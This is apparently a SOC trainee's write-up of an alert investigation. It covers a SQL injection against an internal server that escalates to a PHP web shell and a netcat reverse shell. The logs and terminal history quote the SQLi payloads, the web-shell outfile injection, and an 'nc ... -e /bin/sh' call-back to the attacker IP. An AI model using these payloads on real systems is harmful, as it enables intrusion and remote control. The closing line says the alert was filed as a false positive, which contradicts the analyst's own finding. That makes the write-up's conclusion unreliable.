# EventID-89

## Event Summary

| Field | Value |
|------|-------|
| Event ID | 89 |
| Event Time | Apr 18, 2021 – 01:00 PM |
| Rule | SOC142 – Multiple HTTP 500 Response |
| Source Address | 101[.]32[.]223[.]119 |
| Source Hostname | 101[.]32[.]223[.]119 |
| Destination Address | 172[.]16[.]20[.]6 |
| Destination Hostname | SQLServer |
| Username | www-data |
| Device Action | Allowed |
| Request URL | `https://172[.]16[.]20[.]6/userNumber=1 AND (SELECT * FROM Users) = 1` |
| User Agent | Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 |


First thing I did was copied down the who(Source,destination address) what (Rule: SOC142 - Multiple HTTP 500 Response) When (Apr, 18, 2021, 01:00 PM). 
To get an idea of what I'm looking at. Now I need to check the artifacts and see if this is a true or false positive as well as establish next steps depending on the answer 
to that initial question.

Once I had the information down I ran the Source IP against VirusTotal and HybridAnalysis to see if it has any history of being malicious, 
I saw that on VirusTotal0/91 vendors flagged it as malicious but it has a community score of -14 which is something to keep in mind. 

<br/>
<img src="https://i.imgur.com/D2Xz8Rm.png" height="80%" width="80%" alt="VirusTotal result"/>
<br />

On HybridAnalysis it came back with a threatscore of 50/100 which is not indicative of it being harmless.

<br/>
<img src="https://i.imgur.com/DxIHoS8.png" height="80%" width="80%" alt="VirusTotal result"/>
<br />

Already off the bat, the requested URL is extremely suspicious (https://172[.]16[.]20[.]6/userNumber=1 AND (SELECT * FROM Users) = 1) this is definitely indicative of a SQL injection attack where you input SQL into fields or url to access the underlying data.

Next I checked the log management to see if the same source address has attempted access previously or since. The very first access attempt by the suspicious IP is as follows (https://172[.]16[.]20[.]6/userNumber=' OR '' = ') which is the textbook SQL injection example.

At this point I am fairly confident that this was a malicious attempt, what raises alarm bells is some of these requests are passing through with an http response code of 200. Grabbed the following artifacts from the logs:

Request URL: https://172[.]16[.]20[.]6/userNumber=' OR '' = '
Response Code: 500
<br/>
Request URL: https://172[.]16[.]20[.]6/userNumber=' union select 1, '<?php system($_GET['cmd']); ?>' into outf...
Response Code: 200
<br/>
Request URL: https://172[.]16[.]20[.]6/userNumber=-1 UNION SELECT 1 INTO @,@
Response Code: 500
<br/>
Request URL: https://172[.]16[.]20[.]6/cmd.php?cmd=whoami
Response Code: 200
<br/>
Request URL: https://172[.]16[.]20[.]6/userNumber=1 AND (SELECT * FROM Users) = 1
Response Code: 500
<br/>
Request URL: https://172[.]16[.]20[.]6/cmd.php?cmd=id
Response Code: 200
<br/>
Request URL: https://172[.]16[.]20[.]6/userNumber=AND true
Response Code: 500
<br/>
Request URL: https://172[.]16[.]20[.]6/cmd.php?cmd=nc 101[.]32[.]223[.]119 1234 -e /bin/sh

I'm positive this is not a false positive case but I still want to try to find the scope. To prevent further spread I'm going to isolate the affected server from the network as well as check command history as the most recent request url started a netcat session that is allowing a remote shell to becon out to the malicious ip address located at 101.32.223.119.

I navigated to the endpoint security section to contain the 172[.]16[.]20[.]6 (SQLServer) endpoint.
Once host was contained I looked at the terminal history and it is as follows:

2021-04-17 17:10 : pwd
<br/>
2021-04-17 17:12 : ls
<br/>
2021-04-17 18:12 : mkdir tempDb
<br/>
2021-04-17 18:54 : cd tempDb
<br/>
2021-04-17 18:55 : git clone https://github.com/postgres/postgres
<br/>
2021-04-18 09:12 : apt-get update
<br/>
2021-04-18 09:13 : sudo apt-get install wget ca-certificates
<br/>
2021-04-18 09:14 : wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc
<br/>
2021-04-18 09:15 : sudo apt-get install postgresql postgresql-contrib
<br/>
2021-04-18 13:01 : whoami
<br/>
2021-04-18 13:02 : id
<br/>
2021-04-18 13:05 : nc 101[.]32[.]223[.]119 1234 -e /bin/sh
<br/>
2021-04-18 15:01 : apt show postgresql
<br/>
2021-04-18 15:02 : sudo apt install postgresql postgresql-contrib

These commands ran shown a clear attack taking place, and attempt to exfil data. They created a temporary storage to move data to (tempDB) and downloaded postgress as well as installed dependencies. The nc (netcat) command is to establish persistance and the following commands are to use postgresql to mainpulate sql data.

I am confident beyond a shadow of a doubt that this is not a false positive. Now that I finished my investigation I'm going to follow alongside the playbook (In a real life instace of an event or incident I would follow any established playbooks that relate to first, however I'm trying to sharpen my skills and gain more hands on experience without handholding).

Per the playbook:

Step 1: Collection Data
Please check alert details fot belows.

Source Address
Destination Address
User-Agent

We have this information from when we first started the alert

Step 2: 

Search Log
Please search in Log Management for details.

Log Management

I ran through these steps earlier to see what traffic the malicious IP has sent previously

Step 3: Analyze URL Address
Analyze URL in 3rd party tools. 
You can use the free products/services below.

AnyRun
VirusTotal
URLHouse
URLScan
HybridAnalysis

Last step is to add any artifacts, for this I'll add in the source address: 
101.32.223.119

After I finished the playbook I submitted it as a false positive and got confirmation I was correct
